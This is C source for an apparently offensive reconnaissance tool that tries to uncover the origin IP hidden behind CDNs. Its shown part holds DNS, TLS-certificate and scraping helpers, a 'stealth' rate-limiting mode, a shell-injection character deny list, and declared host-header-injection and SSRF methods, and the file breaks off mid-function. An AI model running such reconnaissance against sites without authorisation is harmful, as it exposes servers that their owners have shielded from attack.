// ═══════════════════════════════════════════════════════════════
// ORIGIN IP DISCOVERY TOOL - BuGGy137 EDITION
// ═══════════════════════════════════════════════════════════════
// COMPLETE 30-METHOD IMPLEMENTATION - NO EXTERNAL DEPENDENCIES
// ALL LOGIC IN NATIVE C - NO system() OR popen() CALLS
//
// COMPILE: gcc -o origin_finder origin_finder.c -lcurl -lssl -lcrypto -lpthread -O2 -lm
// USAGE:   ./origin_finder target.com [--deep] [--no-stealth] [--debug] [--aggressive]
// ═══════════════════════════════════════════════════════════════

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <curl/curl.h>
#include <openssl/ssl.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <time.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <ctype.h>
#include <sys/stat.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <math.h>
#include <sys/time.h>
#include <regex.h>
#include <stdint.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <net/if.h>

#define MAX_THREADS 50
#define TIMEOUT 5
#define LOG_FILE "origin_discovery.log"
#define MAX_CNAME_DEPTH 10
#define SSRF_LISTENER_PORT 9999
#define VALIDATION_PORT_SCAN_COUNT 10

// Stealth Configuration
#define REQUESTS_PER_SECOND 3
#define MIN_DELAY_MS 500
#define MAX_DELAY_MS 1500

// Timing Constants
#define TIMING_SAMPLES 3
#define PROXY_PENALTY_THRESHOLD_MS 30
#define MAX_TIMING_DIFFERENCE_MS 200

// Cloudflare Certificate URLs
#define CLOUDFLARE_ORIGIN_CERT_URL "https://developers.cloudflare.com/ssl/static/authenticated_origin_pull_ca.pem"
#define CLOUDFLARE_CERT_FILE "cloudflare_origin.pem"

// Error page test path (non-existent)
#define ERROR_TEST_PATH "/buggy137_test_9999_nonexistent_"
#define RANDOM_TEST_PATH_LEN 32

// Custom header for normalization test
#define CUSTOM_HEADER_NAME "X-mY-HeAdEr-Test"
#define CUSTOM_HEADER_VALUE "test_value_origin_check"

// Alternative ports to test
static const int ALTERNATIVE_PORTS[] = {8080, 8443, 8081, 8444, 8888, 7443, 9443, 10000, 18080, 18443};
static const int ALTERNATIVE_PORT_COUNT = 10;

// Common subdomains for brute force
static const char *COMMON_SUBDOMAINS[] = {
    "www", "mail", "ftp", "webmail", "smtp", "pop", "ns1", "ns2", 
    "blog", "web", "dev", "staging", "test", "api", "admin", "dashboard",
    "portal", "support", "forum", "wiki", "shop", "store", "cdn", "status"
};
#define COMMON_SUBDOMAINS_COUNT 24

// Thread data structure for DNS bruteforce
typedef struct {
    char subdomain[64];
    char domain[128];
} ThreadData;

typedef struct {
    char ip[INET6_ADDRSTRLEN];
    int confidence;
    char method[64];
    char server_banner[128];
    char organization[256];
    char additional_info[512];
    char html_hash[65];            // SHA256 hash (64 chars + null)
    char error_page_hash[65];      // SHA256 hash of error page
    double avg_response_time;      // Average TTFB in ms
    int timing_samples;            // Number of timing samples taken
    int service_correlation_score; // Cross-protocol matching score
    char alt_ports_open[256];      // List of open alternative ports
    int validation_score;          // 0-100 validation score
    int header_normalization_check; // 0=unknown, 1=normalized (proxy), 2=not normalized (origin)
    int error_page_match;          // 0=unknown, 1=match, 2=no match
    int sni_default_misconfig;     // 1=misconfigured SNI
    int fuzzy_html_match;          // Fuzzy HTML structural match percentage
} OriginCandidate;

typedef struct {
    char *data;
    size_t size;
} HttpResponse;

typedef struct {
    char *title;
    char *body_hash;
    char *error_page_hash;
    size_t content_length;
    char *structural_hash;
    char *fuzzy_hash;           // Fuzzy HTML tag-only hash
    char *tags_only;            // HTML tags only (no text)
} HtmlFingerprint;

// JSON parsing structure
typedef struct {
    char **items;
    int count;
} JsonArray;

// DNS record structure
typedef struct {
    char type[10];
    char value[256];
} DNSRecord;

// Globals
OriginCandidate candidates[100];
int candidate_count = 0;
pthread_mutex_t log_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t rate_limit_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t validation_mutex = PTHREAD_MUTEX_INITIALIZER;
time_t last_request_time = 0;
int requests_this_second = 0;
int stealth_mode = 1;
int debug_mode = 0;
int aggressive_mode = 0;
char ssrf_server_ip[INET_ADDRSTRLEN];
static int mtls_cert_downloaded = 0;
HtmlFingerprint domain_fingerprint = {0};
char target_domain[256] = {0};
char domain_error_hash[65] = {0};
char random_test_path[64] = {0};
SSL_CTX *ssl_ctx = NULL;

// ================================================================
// FUNCTION PROTOTYPES
// ================================================================

// Basic Utility Functions
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp);
size_t write_file_callback(void *ptr, size_t size, size_t nmemb, FILE *stream);
int is_valid_ip(const char *ip);
int is_cdn_ip(const char *ip);
int is_cdn_domain(const char *domain);
int is_valid_domain(const char *domain);
int sanitize_input(const char *input);
void native_dns_query(const char *domain, const char *type, char *result, size_t result_size);
void log_result_extended(const char *message, const char *ip, const char *method, 
                         int confidence, const char *banner, const char *org, const char *info);
void log_result(const char *message, const char *ip, const char *method, int confidence);

// Original Methods (1-20)
void cname_recursion(const char *domain);
void banner_grab_and_verify(const char *ip, const char *domain);
void whois_correlation_native(const char *ip, const char *domain);
void ssl_certificate_scan_native(const char *domain);
void ssl_serial_number_search_native(const char *domain);
void check_ipv6_leak(const char *domain);
void try_zone_transfer_native(const char *domain);
void dns_bruteforce(const char *domain);
void check_mx_records(const char *domain);
void check_historical_dns_native(const char *domain);
void check_crt_sh_native(const char *domain);
void check_dns_records(const char *domain);
void check_http_redirects(const char *domain);
void check_x_headers(const char *domain);
void check_robots_txt(const char *domain);
void check_sitemap_xml(const char *domain);
void check_crossdomain_xml(const char *domain);
void check_host_header_injection(const char *domain);
void check_public_ip(const char *domain);
void check_cdn_detection(const char *domain);

// Advanced Modules
void subnet_neighbor_scan(const char *found_ip, const char *domain);
int32_t murmurhash3(const void *key, size_t len, uint32_t seed);
void favicon_fingerprint_scan(const char *ip, const char *domain);
void absolute_url_bypass_test(const char *domain, const char *ip);
void mtls_probe_native(const char *ip);
void sni_default_probe(const char *ip, const char *domain);

// Validation Methods
void compute_sha256(const unsigned char *data, size_t len, char *sha256_hash);
void compute_md5(const unsigned char *data, size_t len, char *md5_hash);
char* extract_html_title(const char *html);
void html_content_hashing_validation(const char *ip, const char *domain);
void html_fuzzy_hashing_validation(const char *ip, const char *domain);
double measure_ttfb(const char *url, const char *host_header);
void proxy_penalty_timing_attack(const char *ip, const char *domain);
void cross_protocol_service_correlation(const char *ip, const char *domain);
void alternative_services_probing(const char *ip, const char *domain);
void generate_random_test_path(char *buffer, size_t size);
char* fetch_error_page_hash(const char *url, const char *host_header);
void error_page_fingerprint_validation(const char *ip, const char *domain);
size_t header_callback(char *buffer, size_t size, size_t nitems, void *userdata);
void header_normalization_check(const char *ip, const char *domain);

// Native JSON Parsing
JsonArray parse_crt_sh_json(const char *json);
void free_json_array(JsonArray *array);
void extract_html_tags_only(const char *html, char *tags_buffer, size_t buffer_size);
int fuzzy_string_match(const char *str1, const char *str2);

// Native DNS Functions
DNSRecord* resolve_dns_native(const char *domain, const char *type, int *count);
void free_dns_records(DNSRecord *records, int count);
char* get_txt_records_native(const char *domain);

// Native SSL/TLS Functions
X509* get_ssl_certificate_native(const char *hostname, int port);
void extract_certificate_info(X509 *cert, char *subject, size_t subj_len, 
                              char *issuer, size_t iss_len, char *serial, size_t ser_len);
char** get_certificate_sans(X509 *cert, int *count);
void free_string_array(char **array, int count);

// Historical DNS scraping
void scrape_viewdns_info(const char *domain, char **ips, int *ip_count);

// SSRF and Report
void *ssrf_listener_thread(void *arg);
void start_ssrf_listener();
void print_ssrf_instructions(const char *domain);
void generate_report();

// ================================================================
// BANNER AND STYLISH OUTPUT FUNCTIONS
// ================================================================

void print_banner() {
    // Clear screen for dramatic effect
    system("clear"); 

    printf("\n\033[1;35m"); // Set Color to Magenta/Purple
    printf("╔═══════════════════════════════════════════════════════════════════════════╗\n");
    printf("║                                                                           ║\n");
    printf("║   ██████╗ ██╗   ██╗ ██████╗  ██████╗ ██╗   ██╗  ██╗██████╗ ███████╗       ║\n");
    printf("║   ██╔══██╗██║   ██║██╔════╝ ██╔════╝ ╚██╗ ██╔╝ ███║╚════██╗╚════██║       ║\n");
    printf("║   ██████╔╝██║   ██║██║  ███╗██║  ███╗ ╚████╔╝  ╚██║ █████╔╝    ██╔╝       ║\n");
    printf("║   ██╔══██╗██║   ██║██║   ██║██║   ██║  ╚██╔╝    ██║ ╚═══██╗   ██╔╝        ║\n");
    printf("║   ██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝   ██║     ██║██████╔╝   ██║         ║\n");
    printf("║   ╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝    ╚═╝     ╚═╝╚═════╝    ╚═╝         ║\n");
    printf("║                                                                           ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════════════╝\033[0m\n");
    
    printf("\033[1;36m"); // Set Color to Cyan
    printf("        ╔═══════════════════════════════════════════════════════╗\n");
    printf("        ║      ADVANCED ORIGIN IP DISCOVERY SYSTEM              ║\n");
    printf("        ║           Developed By Rehan Malek                    ║\n");
    printf("        ╚═══════════════════════════════════════════════════════╝\033[0m\n\n");
}
void print_method_header(const char *method_name) {
    printf("\033[1;33m[•] %-40s \033[1;37m[\033[1;32mEXECUTING\033[1;37m]\033[0m\n", method_name);
}

void print_success(const char *message) {
    printf("    \033[1;32m✓ %s\033[0m\n", message);
}

void print_info(const char *message) {
    printf("    \033[1;36m→ %s\033[0m\n", message);
}

void print_warning(const char *message) {
    printf("    \033[1;33m⚠ %s\033[0m\n", message);
}

void print_error(const char *message) {
    printf("    \033[1;31m✗ %s\033[0m\n", message);
}

void print_phase_header(const char *phase_name) {
    printf("\n\033[1;35m╔══════════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║ \033[1;36m%-66s\033[1;35m ║\033[0m\n", phase_name);
    printf("\033[1;35m╚══════════════════════════════════════════════════════════════════╝\033[0m\n");
}

void print_ip_discovery(const char *ip, const char *method, int confidence) {
    if (confidence >= 90) {
        printf("    \033[1;32m🔥 \033[1;37mIP: \033[1;33m%-15s \033[1;37m| Method: \033[1;36m%-20s \033[1;37m| Confidence: \033[1;32m%d%%\033[0m\n", 
               ip, method, confidence);
    } else if (confidence >= 70) {
        printf("    \033[1;33m[+] \033[1;37mIP: \033[1;33m%-15s \033[1;37m| Method: \033[1;36m%-20s \033[1;37m| Confidence: \033[1;33m%d%%\033[0m\n", 
               ip, method, confidence);
    } else {
        printf("    \033[1;37m• \033[1;37mIP: \033[1;33m%-15s \033[1;37m| Method: \033[1;36m%-20s \033[1;37m| Confidence: \033[1;37m%d%%\033[0m\n", 
               ip, method, confidence);
    }
}

// ================================================================
// BASIC UTILITY FUNCTIONS
// ================================================================

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    HttpResponse *mem = (HttpResponse *)userp;
    char *ptr = realloc(mem->data, mem->size + realsize + 1);
    if(!ptr) return 0;
    mem->data = ptr;
    memcpy(&(mem->data[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->data[mem->size] = 0;
    return realsize;
}

size_t write_file_callback(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    return fwrite(ptr, size, nmemb, stream);
}

int is_valid_ip(const char *ip) {
    if (!ip || strlen(ip) < 7) return 0;
    struct sockaddr_in sa;
    struct sockaddr_in6 sa6;
    return (inet_pton(AF_INET, ip, &(sa.sin_addr)) == 1) || 
           (inet_pton(AF_INET6, ip, &(sa6.sin6_addr)) == 1);
}

int is_cdn_ip(const char *ip) {
    if (!ip) return 0;
    
    // Common CDN CIDR starts
    const char *cdn_ranges[] = {
        "104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.", 
        "104.24.", "104.25.", "104.26.", "104.27.", "104.28.", "104.29.", "104.30.", "104.31.",
        "172.64.", "172.65.", "172.66.", "172.67.", "172.68.", "172.69.", "172.70.", "172.71.", 
        "108.162.", "108.163.", "108.164.", "108.165.", "108.166.", "108.167.", "108.168.", "108.169.",
        "162.158.", "162.159.", "198.41.", "198.42.", "198.43.", "198.44.", "198.45.", "198.46.", 
        "198.47.", "198.48.", "131.0.", "141.101.", "185.93.", "188.114.", "190.93.", "197.234.", "199.27."
    };
    
    for(int i = 0; i < sizeof(cdn_ranges)/sizeof(cdn_ranges[0]); i++) {
        if(strncmp(ip, cdn_ranges[i], strlen(cdn_ranges[i])) == 0) return 1;
    }
    
    return 0;
}

int is_cdn_domain(const char *domain) {
    if (!domain) return 0;
    const char *cdn_patterns[] = {
        "cloudflare", "akamai", "fastly", "cloudfront", "incapsula",
        "edgecast", "stackpath", "sucuri", "keycdn", "bunnycdn"
    };
    
    char domain_lower[256];
    strncpy(domain_lower, domain, 255);
    domain_lower[255] = 0;
    for(int i = 0; domain_lower[i]; i++) domain_lower[i] = tolower(domain_lower[i]);
    
    for(int i = 0; i < sizeof(cdn_patterns)/sizeof(cdn_patterns[0]); i++) {
        if(strstr(domain_lower, cdn_patterns[i]) != NULL) return 1;
    }
    return 0;
}

int is_valid_domain(const char *domain) {
    if (!domain || strlen(domain) < 1) return 0;
    int has_dot = 0, has_valid_chars = 1, len = strlen(domain);
    
    for (int i = 0; i < len; i++) {
        if (domain[i] == '.') has_dot = 1;
        if (!isalnum((unsigned char)domain[i]) && domain[i] != '.' && 
            domain[i] != '-' && domain[i] != '_') has_valid_chars = 0;
    }
    
    return has_dot && has_valid_chars && len > 3;
}

int sanitize_input(const char *input) {
    if (!input || strlen(input) > 255) return 0;
    
    for (int i = 0; input[i]; i++) {
        if (!isalnum((unsigned char)input[i]) && input[i] != '.' && 
            input[i] != '-' && input[i] != '_' && input[i] != '/') {
            if (strchr(":/?#[]@!$&'()*+,;=%", input[i]) == NULL) return 0;
        }
    }
    
    const char *dangerous[] = {"&&", "||", ";", "`", "$(", "|", ">", "<", "\\", "\"", "'", "\n", "\r"};
    for (int i = 0; i < 13; i++) {
        if (strstr(input, dangerous[i]) != NULL) return 0;
    }
    
    return 1;
}

// Native DNS resolver using getaddrinfo
void native_dns_query(const char *domain, const char *type, char *result, size_t result_size) {
    if (!sanitize_input(domain)) { result[0] = 0; return; }
    
    struct addrinfo hints, *res, *p;
    int status;
    
    memset(&hints, 0, sizeof hints);
    
    if (strcmp(type, "A") == 0) {
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
    } else if (strcmp(type, "AAAA") == 0) {
        hints.ai_family = AF_INET6;
        hints.ai_socktype = SOCK_STREAM;
    } else {
        result[0] = 0;
        return;
    }
    
    status = getaddrinfo(domain, NULL, &hints, &res);
    if (status != 0) {
        result[0] = 0;
        return;
    }
    
    // Get the first IP address
    for (p = res; p != NULL; p = p->ai_next) {
        void *addr;
        char ipstr[INET6_ADDRSTRLEN];
        
        if (p->ai_family == AF_INET) { // IPv4
            struct sockaddr_in *ipv4 = (struct sockaddr_in *)p->ai_addr;
            addr = &(ipv4->sin_addr);
        } else { // IPv6
            struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)p->ai_addr;
            addr = &(ipv6->sin6_addr);
        }
        
        inet_ntop(p->ai_family, addr, ipstr, sizeof ipstr);
        strncpy(result, ipstr, result_size - 1);
        result[result_size - 1] = 0;
        break;
    }
    
    freeaddrinfo(res);
}

void log_result_extended(const char *message, const char *ip, const char *method, 
                         int confidence, const char *banner, const char *org, const char *info) {
    if (!is_valid_ip(ip)) {
        if (debug_mode) print_error("Skipping invalid IP");
        return;
    }
    
    pthread_mutex_lock(&log_mutex);
    
    int exists = 0;
    for (int i = 0; i < candidate_count; i++) {
        if (strcmp(candidates[i].ip, ip) == 0) {
            exists = 1;
            if (confidence > candidates[i].confidence) candidates[i].confidence = confidence;
            break;
        }
    }
    
    if (!exists && candidate_count < 100) {
        strncpy(candidates[candidate_count].ip, ip, INET6_ADDRSTRLEN - 1);
        candidates[candidate_count].ip[INET6_ADDRSTRLEN - 1] = 0;
        candidates[candidate_count].confidence = confidence;
        strncpy(candidates[candidate_count].method, method, 63);
        candidates[candidate_count].method[63] = 0;
        
        if(banner && strlen(banner) > 0) {
            strncpy(candidates[candidate_count].server_banner, banner, 127);
            candidates[candidate_count].server_banner[127] = 0;
        }
        
        if(org && strlen(org) > 0) {
            strncpy(candidates[candidate_count].organization, org, 255);
            candidates[candidate_count].organization[255] = 0;
        }
        
        if(info && strlen(info) > 0) {
            strncpy(candidates[candidate_count].additional_info, info, 511);
            candidates[candidate_count].additional_info[511] = 0;
        }
        
        candidate_count++;
    }
    
    FILE *f = fopen(LOG_FILE, "a");
    if (f) {
        time_t now = time(NULL);
        char *timestamp = ctime(&now);
        timestamp[strlen(timestamp)-1] = '\0';
        fprintf(f, "[%s] %s | IP: %s | Method: %s | Conf: %d%%", 
                timestamp, message, ip, method, confidence);
        if(banner && strlen(banner) > 0) fprintf(f, " | Banner: %s", banner);
        if(org && strlen(org) > 0) fprintf(f, " | Org: %s", org);
        if(info && strlen(info) > 0) fprintf(f, " | Info: %s", info);
        fprintf(f, "\n");
        fclose(f);
    }
    
    pthread_mutex_unlock(&log_mutex);
    
    print_ip_discovery(ip, method, confidence);
}

void log_result(const char *message, const char *ip, const char *method, int confidence) {
    log_result_extended(message, ip, method, confidence, NULL, NULL, NULL);
}

// ================================================================
// NATIVE JSON PARSING FUNCTIONS (REPLACES jq)
// ================================================================

JsonArray parse_crt_sh_json(const char *json) {
    JsonArray result = {0};
    result.items = NULL;
    result.count = 0;
    
    if (!json) return result;
    
    // Simple JSON parsing for crt.sh format
    const char *ptr = json;
    char **items = malloc(100 * sizeof(char*));
    if (!items) return result;
    
    int count = 0;
    
    while (*ptr && count < 100) {
        // Look for "common_name" field
        if (strncmp(ptr, "\"common_name\"", 13) == 0) {
            ptr += 13;
            // Find colon
            while (*ptr && *ptr != ':') ptr++;
            if (*ptr == ':') ptr++;
            // Find opening quote
            while (*ptr && *ptr != '"') ptr++;
            if (*ptr == '"') {
                ptr++;
                const char *start = ptr;
                // Find closing quote
                while (*ptr && *ptr != '"') ptr++;
                if (*ptr == '"') {
                    size_t len = ptr - start;
                    items[count] = malloc(len + 1);
                    if (items[count]) {
                        strncpy(items[count], start, len);
                        items[count][len] = '\0';
                        count++;
                    }
                }
            }
        }
        ptr++;
    }
    
    result.items = items;
    result.count = count;
    return result;
}

void free_json_array(JsonArray *array) {
    if (array && array->items) {
        for (int i = 0; i < array->count; i++) {
            free(array->items[i]);
        }
        free(array->items);
        array->items = NULL;
        array->count = 0;
    }
}

// ================================================================
// FUZZY HTML STRUCTURAL HASHING (TAG-ONLY HASHING)
// ================================================================

void extract_html_tags_only(const char *html, char *tags_buffer, size_t buffer_size) {
    if (!html || !tags_buffer || buffer_size < 1) return;
    
    const char *ptr = html;
    char *out = tags_buffer;
    size_t remaining = buffer_size - 1;
    int in_tag = 0;
    int in_comment = 0;
    
    while (*ptr && remaining > 1) {
        // Check for HTML comments
        if (!in_comment && strncmp(ptr, "<!--", 4) == 0) {
            in_comment = 1;
            ptr += 4;
            continue;
        }
        
        if (in_comment && strncmp(ptr, "-->", 3) == 0) {
            in_comment = 0;
            ptr += 3;
            continue;
        }
        
        if (in_comment) {
            ptr++;
            continue;
        }
        
        // Handle tags
        if (*ptr == '<') {
            in_tag = 1;
        }
        
        if (in_tag) {
            if (remaining > 1) {
                *out++ = *ptr;
                remaining--;
            }
            
            if (*ptr == '>') {
                in_tag = 0;
            }
        }
        
        ptr++;
    }
    
    *out = '\0';
}

int fuzzy_string_match(const char *str1, const char *str2) {
    if (!str1 || !str2) return 0;
    
    int len1 = strlen(str1);
    int len2 = strlen(str2);
    
    if (len1 == 0 || len2 == 0) return 0;
    
    // Simple similarity check - count matching characters in sequence
    int matches = 0;
    int i = 0, j = 0;
    
    while (i < len1 && j < len2) {
        if (str1[i] == str2[j]) {
            matches++;
            i++;
            j++;
        } else if (str1[i] < str2[j]) {
            i++;
        } else {
            j++;
        }
    }
    
    // Calculate percentage
    int max_len = len1 > len2 ? len1 : len2;
    return (matches * 100) / max_len;
}

// ================================================================
// NATIVE DNS FUNCTIONS (REPLACES dig)
// ================================================================

DNSRecord* resolve_dns_native(const char *domain, const char *type, int *count) {
    // This is a simplified version - in production, you'd want a full DNS resolver
    // For now, we'll use getaddrinfo for A/AAAA records
    *count = 0;
    
    if (strcmp(type, "A") == 0 || strcmp(type, "AAAA") == 0) {
        struct addrinfo hints, *res, *p;
        int status;
        
        memset(&hints, 0, sizeof hints);
        hints.ai_family = (strcmp(type, "A") == 0) ? AF_INET : AF_INET6;
        hints.ai_socktype = SOCK_STREAM;
        
        status = getaddrinfo(domain, NULL, &hints, &res);
        if (status != 0) return NULL;
        
        // Count results
        int record_count = 0;
        for (p = res; p != NULL; p = p->ai_next) record_count++;
        
        DNSRecord *records = malloc(record_count * sizeof(DNSRecord));
        if (!records) {
            freeaddrinfo(res);
            return NULL;
        }
        
        int i = 0;
        for (p = res; p != NULL && i < record_count; p = p->ai_next) {
            void *addr;
            char ipstr[INET6_ADDRSTRLEN];
            
            if (p->ai_family == AF_INET) {
                struct sockaddr_in *ipv4 = (struct sockaddr_in *)p->ai_addr;
                addr = &(ipv4->sin_addr);
            } else {
                struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)p->ai_addr;
                addr = &(ipv6->sin6_addr);
            }
            
            inet_ntop(p->ai_family, addr, ipstr, sizeof ipstr);
            strcpy(records[i].type, type);
            strncpy(records[i].value, ipstr, sizeof(records[i].value) - 1);
            records[i].value[sizeof(records[i].value) - 1] = '\0';
            i++;
        }
        
        freeaddrinfo(res);
        *count = record_count;
        return records;
    }
    
    return NULL;
}

void free_dns_records(DNSRecord *records, int count) {
    if (records) free(records);
}

char* get_txt_records_native(const char *domain) {
    // This is a placeholder - in a real implementation, you'd need
    // to use the DNS protocol directly or a DNS library
    return NULL;
}

// ================================================================
// NATIVE SSL/TLS FUNCTIONS (REPLACES openssl command)
// ================================================================

X509* get_ssl_certificate_native(const char *hostname, int port) {
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) return NULL;
    
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
    
    SSL *ssl = SSL_new(ctx);
    if (!ssl) {
        SSL_CTX_free(ctx);
        return NULL;
    }
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return NULL;
    }
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    
    // Resolve hostname
    struct hostent *host = gethostbyname(hostname);
    if (!host) {
        close(sock);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return NULL;
    }
    memcpy(&addr.sin_addr, host->h_addr_list[0], host->h_length);
    
    // Set timeout
    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return NULL;
    }
    
    SSL_set_fd(ssl, sock);
    
    // Set SNI
    SSL_set_tlsext_host_name(ssl, hostname);
    
    if (SSL_connect(ssl) <= 0) {
        close(sock);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return NULL;
    }
    
    X509 *cert = SSL_get_peer_certificate(ssl);
    if (!cert) {
        close(sock);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return NULL;
    }
    
    SSL_shutdown(ssl);
    close(sock);
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    
    return cert;
}

void extract_certificate_info(X509 *cert, char *subject, size_t subj_len, 
                              char *issuer, size_t iss_len, char *serial, size_t ser_len) {
    if (!cert) return;
    
    // Get subject
    X509_NAME *subj = X509_get_subject_name(cert);
    if (subj) {
        X509_NAME_oneline(subj, subject, subj_len);
    }
    
    // Get issuer
    X509_NAME *iss = X509_get_issuer_name(cert);
    if (iss) {
        X509_NAME_oneline(iss, issuer, iss_len);
    }
    
    // Get serial number
    ASN1_INTEGER *serial_num = X509_get_serialNumber(cert);
    if (serial_num) {
        BIGNUM *bn = ASN1_INTEGER_to_BN(serial_num, NULL);
        if (bn) {
            char *hex = BN_bn2hex(bn);
            if (hex) {
                strncpy(serial, hex, ser_len - 1);
                serial[ser_len - 1] = '\0';
                OPENSSL_free(hex);
            }
            BN_free(bn);
        }
    }
}

char** get_certificate_sans(X509 *cert, int *count) {
    *count = 0;
    if (!cert) return NULL;
    
    STACK_OF(GENERAL_NAME) *sans = X509_get_ext_d2i(cert, NID_subject_alt_name, NULL, NULL);
    if (!sans) return NULL;
    
    int num_sans = sk_GENERAL_NAME_num(sans);
    char **result = malloc(num_sans * sizeof(char*));
    if (!result) {
        sk_GENERAL_NAME_pop_free(sans, GENERAL_NAME_free);
        return NULL;
    }
    
    int idx = 0;
    for (int i = 0; i < num_sans; i++) {
        GENERAL_NAME *gn = sk_GENERAL_NAME_value(sans, i);
        if (gn->type == GEN_DNS) {
            unsigned char *dns_name;
            int len = ASN1_STRING_to_UTF8(&dns_name, gn->d.dNSName);
            if (len > 0) {
                result[idx] = malloc(len + 1);
                if (result[idx]) {
                    strncpy(result[idx], (char*)dns_name, len);
                    result[idx][len] = '\0';
                    idx++;
                }
                OPENSSL_free(dns_name);
            }
        }
    }
    
    sk_GENERAL_NAME_pop_free(sans, GENERAL_NAME_free);
    *count = idx;
    return result;
}

void free_string_array(char **array, int count) {
    if (array) {
        for (int i = 0; i < count; i++) {
            free(array[i]);
        }
        free(array);
    }
}

// ================================================================
// HISTORICAL DNS SCRAPING (ROBUST VERSION)
// ================================================================

void scrape_viewdns_info(const char *domain, char **ips, int *ip_count) {
    *ip_count = 0;
    
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    char url[256];
    snprintf(url, sizeof(url), "https://viewdns.info/iphistory/?domain=%s", domain);
    
    HttpResponse res = {0};
    
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.5");
    headers = curl_slist_append(headers, "Connection: keep-alive");
    headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    if (curl_easy_perform(curl) == CURLE_OK && res.data && res.size > 1000) {
        // More robust parsing - look for the actual IP history table
        char *ptr = res.data;
        
        // First, find the IP history table
        char *table_marker = strstr(ptr, "IP Address History");
        if (!table_marker) table_marker = strstr(ptr, "iphistory");
        
        if (table_marker) {
            // Find the table start
            char *table_start = strstr(table_marker, "<table");
            if (table_start) {
                // Find table end
                char *table_end = strstr(table_start, "</table>");
                if (table_end) {
                    // Parse table rows
                    char *row_start = table_start;
                    while ((row_start = strstr(row_start, "<tr")) && row_start < table_end) {
                        char *row_end = strstr(row_start, "</tr>");
                        if (!row_end || row_end > table_end) break;
                        
                        // Find all cells in this row
                        char *cell_start = row_start;
                        while ((cell_start = strstr(cell_start, "<td")) && cell_start < row_end) {
                            char *content_start = strchr(cell_start, '>');
                            if (!content_start || content_start > row_end) break;
                            
                            content_start++; // Skip '>'
                            char *content_end = strstr(content_start, "</td>");
                            if (!content_end || content_end > row_end) break;
                            
                            // Extract cell content
                            char cell_content[256];
                            int len = content_end - content_start;
                            if (len > 0 && len < 255) {
                                strncpy(cell_content, content_start, len);
                                cell_content[len] = '\0';
                                
                                // Clean up HTML entities and whitespace
                                char cleaned[256];
                                int j = 0;
                                for (int i = 0; cell_content[i] && j < 255; i++) {
                                    if (cell_content[i] == '&') {
                                        // Skip HTML entities
                                        while (cell_content[i] && cell_content[i] != ';') i++;
                                        if (cell_content[i]) i++;
                                        continue;
                                    }
                                    if (isspace((unsigned char)cell_content[i])) continue;
                                    cleaned[j++] = cell_content[i];
                                }
                                cleaned[j] = '\0';
                                
                                // Check if this looks like an IP address
                                if (is_valid_ip(cleaned) && !is_cdn_ip(cleaned)) {
                                    // Additional validation
                                    int valid = 1;
                                    
                                    // Skip private/reserved IPs
                                    if (strncmp(cleaned, "10.", 3) == 0 ||
                                        strncmp(cleaned, "192.168.", 8) == 0 ||
                                        strncmp(cleaned, "172.16.", 7) == 0 ||
                                        strncmp(cleaned, "172.17.", 7) == 0 ||
                                        strncmp(cleaned, "172.18.", 7) == 0 ||
                                        strncmp(cleaned, "172.19.", 7) == 0 ||
                                        strncmp(cleaned, "172.20.", 7) == 0 ||
